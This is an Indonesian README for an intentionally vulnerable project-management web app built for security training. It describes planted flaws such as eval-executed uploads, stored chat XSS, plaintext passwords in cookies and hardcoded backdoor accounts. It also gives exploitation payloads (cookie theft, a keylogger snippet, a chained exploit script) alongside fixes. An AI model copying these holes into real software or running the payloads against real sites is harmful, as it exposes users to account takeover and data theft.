# 🚨 Aplikasi Manajemen Proyek Vulnerable

**⚠️ PERINGATAN: Aplikasi ini sengaja dibuat rentan untuk tujuan penelitian keamanan dan edukasi. Gunakan hanya di lingkungan terisolasi!**

## 📋 Deskripsi

Aplikasi manajemen proyek berbasis React/TypeScript dengan Supabase backend yang mengandung kerentanan keamanan kritis untuk demonstrasi dan penelitian security testing.

## 🎯 Kerentanan yang Ada

### 1. **File Upload Remote Code Execution (RCE)**
- File otomatis dieksekusi saat upload tanpa validasi
- JavaScript langsung dijalankan dengan `eval()`
- HTML dengan script ikut dieksekusi
- Validasi file type yang lemah

### 2. **Cross-Site Scripting (XSS) di Chat**
- Pesan chat bisa berisi script berbahaya
- Input tidak disanitasi sebelum ditampilkan
- XSS tersimpan permanen di database

### 3. **Cookie Credential Storage (CRITICAL)**
- Password login tersimpan dalam plaintext di cookies
- Credentials bisa dicuri via JavaScript atau XSS
- Data sensitif accessible via document.cookie

### 4. **Broken Authentication (CRITICAL)**
- Weak password requirements (menerima "123", "a", dll)
- Unlimited login attempts tanpa account lockout
- Hidden backdoor accounts dengan hardcoded credentials
- Insecure session management yang tidak properly logout

## 🚀 Cara Install

### Yang Dibutuhkan
```bash
Node.js versi 16 atau lebih baru
npm atau yarn
Akun Supabase (untuk database)
```

### Langkah Install
```bash
# Clone repository
git clone <repository-url>
cd managment

# Install dependencies
npm install

# Setup environment variables
cp .env.example .env
# Edit file .env dengan kredensial Supabase

# Jalankan aplikasi
npm run dev
```

## 🎯 PANDUAN EKSPLOITASI

---

## 🔴 **KERENTANAN 1: FILE UPLOAD RCE**

### **Langkah Pengujian Sederhana:**

#### **1. Buat File Payload**
Buat file baru bernama `test.js` dengan isi:
```javascript
alert('BERHASIL! File JavaScript dieksekusi');
console.log('Cookie:', document.cookie);
console.log('Data tersimpan:', localStorage);
document.body.style.border = '5px solid red';
```

#### **2. Upload File**
1. Buka aplikasi di browser
2. Login dengan akun apapun
3. Masuk ke halaman project
4. Klik tab "Files"
5. Klik tombol "Upload File"
6. Pilih file `test.js` yang tadi dibuat
7. **Otomatis tereksekusi!**

#### **3. Lihat Hasil**
- Popup alert akan muncul
- Border merah muncul di halaman
- Buka Console browser (F12) untuk lihat data yang dicuri

### **Payload Lainnya:**

#### **HTML dengan Script:**
Buat file `dokumen.html`:
```html
<!DOCTYPE html>
<html>
<head><title>Dokumen Biasa</title></head>
<body>
    <h1>Ini dokumen normal</h1>
    <script>
        alert('HTML dengan JavaScript berhasil dieksekusi!');
        document.body.innerHTML += '<div style="position:fixed;top:0;right:0;background:red;color:white;padding:10px;">TERINFEKSI!</div>';
    </script>
</body>
</html>
```

---

## 🔴 **KERENTANAN 2: CHAT XSS**

### **Langkah Pengujian Sederhana:**

#### **1. Akses Chat**
1. Buka aplikasi
2. Login 
3. Masuk ke project
4. Klik tab "Chat"

#### **2. Kirim Payload XSS**
Ketik dan kirim pesan ini:
```html
<script>alert('XSS BERHASIL di Chat!')</script>
```

#### **3. Lihat Hasil**
- Alert akan muncul saat pesan ditampilkan
- Script tersimpan permanen di database
- Setiap orang yang buka chat akan kena

### **Payload XSS Lainnya:**

#### **Mencuri Cookie:**
```html
<img src="x" onerror="alert('Cookie: ' + document.cookie)">
```

#### **Keylogger Sederhana:**
```html
<img src="x" onerror="
document.addEventListener('keydown', function(e) {
    console.log('Tombol ditekan: ' + e.key);
});
alert('Keylogger terinstall!');
">
```

#### **Menampilkan Data Tersimpan:**
```html
<script>
alert('LocalStorage: ' + JSON.stringify(localStorage));
alert('Cookies: ' + document.cookie);
</script>
```

---

## � **KERENTANAN 3: COOKIE CREDENTIAL STORAGE**

### **Langkah Pengujian Sederhana:**

#### **1. Login dan Cek Cookies**
1. Login dengan username/password apapun
2. Buka Developer Tools (F12)
3. Tab Application → Storage → Cookies
4. Lihat credential yang tersimpan dalam plaintext!

#### **2. Lihat via UI Developer Mode**
1. Setelah login, lihat header aplikasi
2. Klik tombol mata (👁️) di header
3. Panel merah akan muncul dengan semua credentials

#### **3. Curi Credentials via JavaScript**
Upload file atau kirim chat dengan:
```javascript
// Curi semua credentials dari cookies
const cookies = document.cookie.split(';').reduce((acc, cookie) => {
    const [key, value] = cookie.trim().split('=');
    acc[key] = value;
    return acc;
}, {});

alert('CREDENTIALS DICURI!\\n' + 
      'Email: ' + (cookies.user_email || 'None') + '\\n' +
      'Password: ' + (cookies.user_password || 'None'));
```

### **Dampak:**
- Password tersimpan dalam plaintext
- Bisa dicuri via XSS atau malicious script
- Account takeover sangat mudah

---

## � **KERENTANAN 4: BROKEN AUTHENTICATION**

### **Langkah Pengujian Sederhana:**

#### **1. Test Weak Password**
1. Coba register/login dengan password: "1"
2. Coba password: "a" 
3. Coba password: "123"
4. Semua diterima tanpa validation!

#### **2. Test Unlimited Login Attempts**
1. Login dengan email valid tapi password salah
2. Ulangi berkali-kali
3. Lihat counter failed attempts bertambah
4. Tidak ada account lockout!

#### **3. Test Backdoor Access**
1. Gagal login 3 kali untuk melihat hint
2. Coba: `admin@backdoor.com` : `123`
3. Coba: `guest@guest.com` : (kosong)
4. Instant admin access!

#### **4. Test Session Persistence**
1. Login kemudian logout
2. Refresh page dalam 5 detik
3. Auto-login terjadi menggunakan stored credentials

### **Backdoor Accounts:**
- `admin@backdoor.com` : `123`
- `test@test.com` : `test`
- `guest@guest.com` : (no password)

### **Dampak:**
- Brute force attacks unlimited
- Weak password acceptance
- Authentication bypass
- Persistent unauthorized access

---

## �🔥 **SKENARIO SERANGAN GABUNGAN**

### **Serangan Bertahap:**
1. **Backdoor Access:** Login dengan `admin@backdoor.com` : `123`
2. **Upload Malicious File:** Upload `ultimate_exploit.js` 
3. **XSS di Chat:** Kirim payload untuk persistence
4. **Credential Theft:** Akses cookies untuk steal passwords
5. **Complete Takeover:** Full admin access dengan multiple attack vectors

### **Contoh Payload Lengkap:**
Buat file `ultimate_exploit.js`:
```javascript
// ULTIMATE EXPLOIT - Gabungan semua vulnerability

// 1. Tampilkan konfirmasi
alert('🚨 SISTEM TERKOMPROMI! 🚨');

// 2. Curi credentials dari cookies
const cookies = document.cookie.split(';').reduce((acc, cookie) => {
    const [key, value] = cookie.trim().split('=');
    acc[key] = value;
    return acc;
}, {});

// 3. Curi semua data sensitif
const dataYangDicuri = {
    // Credentials dari cookies (CRITICAL!)
    email: cookies.user_email,
    password: cookies.user_password, // Plaintext password!
    userID: cookies.user_id,
    userRole: cookies.user_role,
    
    // Data browser lainnya
    allCookies: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage),
    url: window.location.href,
    userAgent: navigator.userAgent,
    timestamp: new Date().toString()
};

console.log('🔥 COMPLETE DATA BREACH:', dataYangDicuri);

// 4. Kirim data ke attacker (simulasi)
alert('CREDENTIALS BERHASIL DICURI!\\n' +
      'Email: ' + dataYangDicuri.email + '\\n' +
      'Password: ' + dataYangDicuri.password + '\\n' +
      'Role: ' + dataYangDicuri.userRole);

// 5. Buat backdoor permanen dengan stolen credentials
localStorage.setItem('stolen_credentials', JSON.stringify({
    email: dataYangDicuri.email,
    password: dataYangDicuri.password,
    stolenAt: new Date().toString()
}));

// 6. Install keylogger untuk capture future input
document.addEventListener('keydown', function(e) {
    console.log('🔑 Key captured: ' + e.key);
});

// 7. Visual proof of compromise
document.body.style.backgroundColor = '#ffeeee';
document.body.style.border = '5px solid red';

// 8. Persistent notification
const notification = document.createElement('div');
notification.innerHTML = '🚨 ACCOUNT COMPROMISED - Credentials Stolen! 🚨';
notification.style.cssText = 'position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;z-index:9999;padding:10px;font-weight:bold;';
document.body.appendChild(notification);

alert('🔥 ULTIMATE EXPLOIT COMPLETE! All vulnerabilities chained successfully!');
```

---

## 🛡️ **CARA MENDETEKSI SERANGAN**

### **Tanda-tanda Terinfeksi:**

#### **Di Browser Console:**
```
🔍 Security Check: Analyzing test.js
BERHASIL! File JavaScript dieksekusi
Cookie: auth_token=abc123...
```

#### **Perubahan Visual:**
- Border merah di halaman
- Background berubah warna
- Popup atau div aneh muncul

#### **Di LocalStorage:**
- Cek dengan: `console.log(localStorage)`
- Cari entry `backdoor` atau `backdoor_installed`

---

## ⚙️ **SETUP PENGUJIAN**

### **Persiapan:**
```bash
# Jalankan aplikasi
npm run dev

# Buka browser ke
http://localhost:5173

# Buka Developer Tools
Tekan F12 → Tab Console
```

### **Monitoring:**
- **Console:** Lihat log eksekusi script
- **Network:** Monitor request keluar
- **Application → Storage:** Cek localStorage/cookies

---

## 📊 **TINGKAT RISIKO**

| Kerentanan | Dampak | Kemudahan Exploit | Level Risiko |
|------------|--------|-------------------|--------------|
| File Upload RCE | **KRITIS** | **TINGGI** | 🔴 **KRITIS** |
| Chat XSS | **TINGGI** | **TINGGI** | 🔴 **KRITIS** |

### **Dampak Bisnis:**
- **Kerahasiaan:** Data bisa dicuri semua
- **Integritas:** Kode jahat bisa diinjeksi  
- **Ketersediaan:** Sistem bisa dikompromikan

---

## 🔧 **CARA MEMPERBAIKI**

### **Untuk File Upload:**
1. **Validasi Ketat:**
   ```typescript
   const fileAman = ['.pdf', '.docx', '.png', '.jpg'];
   if (!fileAman.includes(ekstensiFIle)) throw new Error('File tidak diizinkan');
   ```

2. **Jangan Eksekusi:**
   ```typescript
   // JANGAN ini:
   eval(fileContent);
   
   // Tapi ini:
   // Simpan file tanpa eksekusi
   ```

### **Untuk Chat XSS:**
1. **Sanitasi Input:**
   ```typescript
   // Gunakan library seperti DOMPurify
   import DOMPurify from 'dompurify';
   const pesanAman = DOMPurify.sanitize(inputUser);
   ```

2. **Render Aman:**
   ```typescript
   // JANGAN ini:
   element.innerHTML = inputUser;
   
   // Tapi ini:
   element.textContent = inputUser;
   ```

---

## ⚠️ **DISCLAIMER HUKUM**

**PERINGATAN PENTING:**

### **Boleh Digunakan Untuk:**
✅ Penelitian keamanan di sistem sendiri  
✅ Belajar dan training  
✅ Penetration testing dengan izin  

### **DILARANG Digunakan Untuk:**
❌ Testing sistem orang lain tanpa izin  
❌ Serangan sungguhan  
❌ Tujuan kriminal  

**Ingat: Gunakan dengan bijak, pelajari dengan etis! 🛡️**
